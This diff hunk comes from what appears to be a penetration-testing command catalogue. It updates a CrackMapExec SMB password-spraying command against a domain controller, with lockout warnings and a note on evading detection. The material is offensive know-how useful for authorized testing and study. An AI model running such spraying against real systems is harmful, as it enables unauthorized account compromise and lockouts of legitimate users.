@@ -890,7 +890,7 @@ warning:'CHECK PASSWORD POLICY BEFORE SPRAYING! Risk of lockouts.',
 notes:'Kerberos-based may evade some detection'},
 
 {id:'CRED_002',phase:'credential-access',title:'CrackMapExec Spray',desc:'SMB-based password spraying',tool:'CrackMapExec',os:'linux',noise:'high',auth:'none',
-cmd:"sudo crackmapexec smb {DC_IP} -u valid_users.txt -p '{PASSWORD}' | grep +",
+cmd:"sudo crackmapexec smb {DC_IP} -u valid_users.txt -p '{PASSWORD}' --continue-on-success | grep +",
 failureIndicators:['No + in output','All attempts fail'],
 warning:'DANGER: Check password policy first! High lockout risk.',
 notes:'Very noisy, generates many logon events'},
